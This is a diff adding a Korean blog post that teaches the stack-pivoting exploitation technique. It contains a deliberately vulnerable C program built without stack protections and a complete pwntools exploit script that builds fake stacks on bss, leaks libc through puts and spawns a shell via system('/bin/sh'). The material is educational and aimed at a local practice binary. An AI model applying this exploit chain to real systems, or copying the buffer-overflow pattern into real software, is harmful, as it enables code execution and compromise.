@@ -1,0 +1,201 @@
+<!doctype html>
+<html lang="ko" data-theme="light"><head>
+  <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[PWNABLE] Stack Pivoting · whrds.log</title><meta name="description" content="※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ gadget을 사용하여 쓰기 권한이 있는 영역에 Fake Stack를 구성하는 기법이다.payload가 저장되어 있는 경우, ret까지만 overflow가 발생해야 한다.payload가 저장되어 있지 않은 경우, chain + leave_ret 까지">
+  <meta name="theme-color" content="#f7f7f3"><link rel="canonical" href="https://whrds.github.io/ko/posts/pwnable-stack-pivoting/">
+  <link rel="alternate" hreflang="ko" href="https://whrds.github.io/ko/posts/pwnable-stack-pivoting/"><link rel="alternate" hreflang="en" href="https://whrds.github.io/en/posts/pwnable-stack-pivoting/">
+  <meta property="og:type" content="article"><meta property="og:title" content="[PWNABLE] Stack Pivoting · whrds.log"><meta property="og:description" content="※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ gadget을 사용하여 쓰기 권한이 있는 영역에 Fake Stack를 구성하는 기법이다.payload가 저장되어 있는 경우, ret까지만 overflow가 발생해야 한다.payload가 저장되어 있지 않은 경우, chain + leave_ret 까지"><meta property="og:url" content="https://whrds.github.io/ko/posts/pwnable-stack-pivoting/">
+  <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml"><link rel="stylesheet" href="/assets/styles.css">
+  <script>try{const t=localStorage.getItem('theme');if(t)document.documentElement.dataset.theme=t;else if(matchMedia('(prefers-color-scheme:dark)').matches)document.documentElement.dataset.theme='dark'}catch(e){}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"[PWNABLE] Stack Pivoting","description":"※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ gadget을 사용하여 쓰기 권한이 있는 영역에 Fake Stack를 구성하는 기법이다.payload가 저장되어 있는 경우, ret까지만 overflow가 발생해야 한다.payload가 저장되어 있지 않은 경우, chain + leave_ret 까지","datePublished":"2024-06-24","inLanguage":"ko","url":"https://whrds.github.io/ko/posts/pwnable-stack-pivoting/","author":{"@type":"Person","name":"whrds"}}</script>
+</head><body>
+  <a class="skip-link" href="#main">본문으로 건너뛰기</a>
+  <header class="site-header"><div class="shell header-inner">
+    <a class="brand" href="/ko/" aria-label="whrds.log home"><span class="brand-mark">W_</span><span class="brand-text">whrds.log</span></a>
+    <nav class="main-nav" aria-label="주 메뉴">
+      <a href="/ko/" aria-current="page">글</a>
+      <a href="/ko/about/">소개</a>
+    </nav>
+    <div class="header-tools">
+      <div class="language-switch" aria-label="Language">
+        <a href="#" class="active" lang="ko" aria-current="true">KO</a>
+        <a href="/en/posts/pwnable-stack-pivoting/" class="" lang="en">EN</a>
+      </div>
+      <button class="icon-button" type="button" data-theme-toggle aria-label="Use dark theme">◐</button>
+    </div>
+  </div></header>
+  <main id="main"><article class="article-wrap"><header class="article-header"><p class="eyebrow">Security research notes</p><h1>[PWNABLE] Stack Pivoting</h1><p class="article-description">※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ gadget을 사용하여 쓰기 권한이 있는 영역에 Fake Stack를 구성하는 기법이다.payload가 저장되어 있는 경우, ret까지만 overflow가 발생해야 한다.payload가 저장되어 있지 않은 경우, chain + leave_ret 까지</p><div class="article-meta"><time datetime="2024-06-24">2024년 6월 24일</time><span>·</span><span>1 분 읽기</span></div></header><div class="prose"><p><strong>※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. <strong>※</strong></strong> </p>
+<p>gadget을 사용하여 쓰기 권한이 있는 영역에 Fake Stack를 구성하는 기법이다.</p>
+<ul>
+<li>payload가 저장되어 있는 경우, ret까지만 overflow가 발생해야 한다.</li>
+<li>payload가 저장되어 있지 않은 경우, chain + leave_ret 까지 넣을 있어야 한다.</li>
+</ul>
+<p>일반적으로 bof취약점을 한번 밖에 사용하지 못하거나 ret까지만 overflow가능한 경우 사용하는 기법이다.</p>
+<p>간단한 예제를 통해 살펴보도록 하겠다.</p>
+<pre><code>// gcc -no-pie -fno-stack-protector -z execstack -o ex ex.c
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int cnt = 0;
+
+void gift(){
+	 __asm__ (&quot;pop %r9&quot;);
+	__asm__ (&quot;pop %r8&quot;);
+	__asm__ (&quot;pop %rcx&quot;);
+	__asm__ (&quot;pop %rdx&quot;);
+	__asm__ (&quot;pop %rsi&quot;);
+	__asm__ (&quot;pop %rdi&quot;);
+	__asm__ (&quot;ret&quot;);
+	__asm__ (&quot;pop %rax&quot;);
+   	__asm__ (&quot;ret&quot;);
+  	__asm__ (&quot;pop %rbx&quot;);
+ 	__asm__ (&quot;ret&quot;);
+ 	__asm__ (&quot;mov %rbx, (%rax)&quot;);
+ 	__asm__ (&quot;ret&quot;);
+ 	__asm__ (&quot;mov %rax, (%rbx)&quot;);
+ 	__asm__ (&quot;ret&quot;);
+}
+
+void initialize() {
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+}
+void vuln() {
+    char buf[0x40];
+    if(cnt != 0){
+	    exit(-1);
+    }
+    cnt = 1;
+    puts(&quot;Hello! whrd&quot;);
+    read(0,buf,0x80);
+}
+int main() {
+    initialize();
+    vuln();
+    return 0;
+}
+</code></pre>
+<p>임의로 gadget들을 만들어 주었다.</p>
+<p>여기서 쓰기 권한이 있는 메모리 영역인 bss를 사용하도록 하겠다.</p>
+<p><img src="/assets/images/tistory/tistory-0fea48d33bf4/001.png" alt=""></p>
+<p>첫번째 payload이다.</p>
+<pre><code>payload = b'a'*0x40
+payload += p64(bss+0x300)
+payload += p64(p_rdx_rsi_rdi)
+payload += p64(0x100)
+payload += p64(bss+0x300)
+payload += p64(0x0)
+payload += p64(read)
+payload += p64(leave_ret)
+p.send(payload)
+</code></pre>
+<p>bss+0x300에다가 fake stack을 구성하고 있다.</p>
+<p>leave-ret 과정을 거치고 나면 rbp와 rsp가 fake_stack을 가리키게 된다.</p>
+<pre><code>payload = p64(bss+0x400)
+payload += p64(p_rdi)
+payload += p64(read_got)
+payload += p64(puts)
+payload += p64(p_rdx_rsi_rdi)
+payload += p64(0x100)
+payload += p64(bss+0x400)
+payload += p64(0x0)
+payload += p64(read)
+payload += p64(leave_ret)
+
+p.send(payload)
+</code></pre>
+<p>leak을 하는 과정이다.</p>
+<p>puts()를 사용하여 libc_base를 구하고 나서 exploit을 위해 bss+0x400 위치에 fake stack을 새로 구성 및 입력을 받고 있다.</p>
+<pre><code>p.recvuntil(b'\x0a')
+leak = u64(p.recvn(6) + b'\x00'*2)
+libc_base = leak - libc.sym['read']
+
+print('libc_base : ', hex(libc_base))
+
+system = libc_base + libc.sym['system']
+binsh = libc_base + next(libc.search(b&quot;/bin/sh&quot;))
+
+payload = p64(0x0)
+payload += p64(p_rdi)
+payload += p64(binsh)
+payload += p64(system)
+
+p.send(payload)
+</code></pre>
+<p>구한 libc를 가지고 system(‘/bin/sh’);를 실행해주면 된다.</p>
+<p><img src="/assets/images/tistory/tistory-0fea48d33bf4/002.png" alt=""></p>
+<p>실행해보면 system()까지 정상적으로 실행되는 것을 확인할 수 있다.</p>
+<pre><code>from pwn import *
+
+target = b'./ex'
+
+context.log_level = 'debug'
+p = process(target)
+e = ELF(target)
+libc = ELF(b'/lib/x86_64-linux-gnu/libc.so.6')
+
+read_got = e.got['read']
+read = e.plt['read']
+puts = e.plt['puts']
+bss = e.bss()
+leave_ret = 0x0000000000401252
+ret = 0x000000000040101a
+p_rdi = 0x00000000004011a5
+p_rsi_rdi = 0x00000000004011a4
+p_rdx_rsi_rdi = 0x00000000004011a3
+
+####################################
+
+payload = b'a'*0x40
+payload += p64(bss+0x300)
+payload += p64(p_rdx_rsi_rdi)
+payload += p64(0x100)
+payload += p64(bss+0x300)
+payload += p64(0x0)
+payload += p64(read)
+payload += p64(leave_ret)
+p.send(payload)
+
+####################################
+
+payload = p64(bss+0x400)
+payload += p64(p_rdi)
+payload += p64(read_got)
+payload += p64(puts)
+payload += p64(p_rdx_rsi_rdi)
+payload += p64(0x100)
+payload += p64(bss+0x400)
+payload += p64(0x0)
+payload += p64(read)
+payload += p64(leave_ret)
+
+p.send(payload)
+
+####################################
+
+p.recvuntil(b'\x0a')
+leak = u64(p.recvn(6) + b'\x00'*2)
+libc_base = leak - libc.sym['read']
+
+print('libc_base : ', hex(libc_base))
+
+system = libc_base + libc.sym['system']
+binsh = libc_base + next(libc.search(b&quot;/bin/sh&quot;))
+
+####################################
+
+payload = p64(0x0)
+payload += p64(p_rdi)
+payload += p64(binsh)
+payload += p64(system)
+
+p.send(payload)
+
+####################################
+
+p.interactive()
+</code></pre>
+</div><div class="article-end"><a href="/ko/">← 모든 글 보기</a><a href="/en/posts/pwnable-stack-pivoting/" hreflang="en">이 글을 영어로 읽기 →</a></div></article></main>
+  <footer class="site-footer"><div class="shell footer-inner"><span>© 2026 whrds</span><span>관찰하고, 검증하고, 기록합니다.</span><a href="/ko/feed.xml">RSS</a></div></footer>
+  <script src="/assets/app.js" defer></script>
+</body></html>
